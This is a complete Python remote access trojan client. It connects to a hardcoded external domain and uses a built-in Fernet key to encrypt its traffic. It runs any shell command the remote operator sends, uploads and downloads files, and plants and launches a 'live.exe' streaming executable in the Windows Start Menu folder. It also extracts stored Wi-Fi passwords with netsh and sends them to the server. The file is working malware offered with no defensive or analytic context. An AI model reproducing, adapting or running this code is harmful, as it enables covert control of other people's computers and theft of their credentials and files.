import os, subprocess, socket, time, re, sys
from cryptography.fernet import Fernet


SERVER_HOST = 'xn--6pw65a019d.xyz'
SERVER_PORT = 421
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
sender_port = 423
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
EXIT = f'{MAIN}Exited{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'
INPUT = f'{BLUE}Input{END}'
REMOTE = WARN = f'{ORANGE}Remote{END}'
CLEAR = f'{PLOAD}CLEARED{END}'


s = socket.socket()
try:
    s.connect((SERVER_HOST, SERVER_PORT))
except socket.error as e:
    sys.exit()
cwd = os.getcwd()
cwd = Fernet(key).encrypt(cwd.encode())
s.send(cwd)

while True:
    command = s.recv(BUFFER_SIZE)
    command = Fernet(key).decrypt(command).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        disconnected_msg = " disconnected quietly"
        disconnected_msg = f"{IPAddr}{disconnected_msg}"
        disconnected = Fernet(key).encrypt(disconnected_msg.encode())
        s.send(disconnected)
        break
    if command == "/getfile":
        filename = s.recv(BUFFER_SIZE)
        filename = Fernet(key).decrypt(filename).decode()
        if filename not in os.listdir():
            path_exist = Fernet(key).encrypt("no".encode())
            s.send(path_exist)
            continue
        if filename in os.listdir():
            path_exist = Fernet(key).encrypt("yes".encode())
            s.send(path_exist)
            time.sleep(0.5)
            file_start = Fernet(key).encrypt((f"receiving {filename}").encode())
            s.send(file_start)
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
    if command == "/sendfile":
        file_location = s.recv(BUFFER_SIZE)
        file_location = Fernet(key).decrypt(file_location).decode()
        if file_location == "no":
            continue
        if file_location == "yes":
            filename = s.recv(BUFFER_SIZE)
            filename = Fernet(key).decrypt(filename).decode()
            remaining = int.from_bytes(s.recv(4),'big')
            f = open(filename,"wb")
            while remaining:
                data = s.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
            file_finish = Fernet(key).encrypt((f"Sent {filename}").encode())
            s.send(file_finish)
    if command == "/getlive":
        userprofile = subprocess.getoutput("echo %username%")
        directory = fr'"C:\Users\{userprofile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe"'
        if os.path.exists(fr'C:\Users\{userprofile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe'):
            server_location = "yes"
            server_location = Fernet(key).encrypt(server_location.encode())
            s.send(server_location)
        else:
            server_location = "no"
            server_location = Fernet(key).encrypt(server_location.encode())
            s.send(server_location)
            remaining = int.from_bytes(s.recv(4),'big')
            f = open(fr'C:\Users\{userprofile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe', 'wb')
            while remaining:
                data = s.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
            server_state = "transferred live Streaming Server"
            server_state = Fernet(key).encrypt(server_state.encode())
            s.send(server_state)
        subprocess.Popen(f'cmd /k {directory} -n {SERVER_HOST} -p {sender_port} & exit', shell=True)
        server_state = "live Streaming Server is running"
        server_state = Fernet(key).encrypt(server_state.encode())
        s.send(server_state)
        continue
    if command == "/stoplive":
        subprocess.Popen("cmd /k taskkill /im live.exe /f")
        sender_port = 422
        continue
    if command == "/getwifi":
        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], shell = True, capture_output = True).stdout.decode()
        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

        wifi_list = []
        wifi_list_profiles = str()
    
        if len(profile_names) != 0:
            for name in profile_names:
                wifi_profile = {}
                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], shell = True, capture_output = True).stdout.decode()
                if re.search("Security key           : Absent", profile_info):
                    continue
                else:
                    wifi_profile["ssid"] = name
                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], shell = True, capture_output = True).stdout.decode()
                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
                    if password == None:
                        wifi_profile["password"] = None
                    else:
                        wifi_profile["password"] = password[1]
                    wifi_list.append(wifi_profile) 
        if wifi_list == []:
            wifi_notfound = Fernet(key).encrypt((f"[{IMPORTANT}] no wifi profiles found{END}").encode())
            s.send(wifi_notfound)  
        if wifi_list != []:
            for x in range(len(wifi_list)):
                wifi_list_new = f"[{INFO}] {wifi_list[x]}\n"
                wifi_list_profiles = wifi_list_profiles + wifi_list_new
            wifi_tosend = Fernet(key).encrypt(wifi_list_profiles.encode())
            s.send(wifi_tosend)
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    message = Fernet(key).encrypt(message.encode())
    s.send(message)
s.close()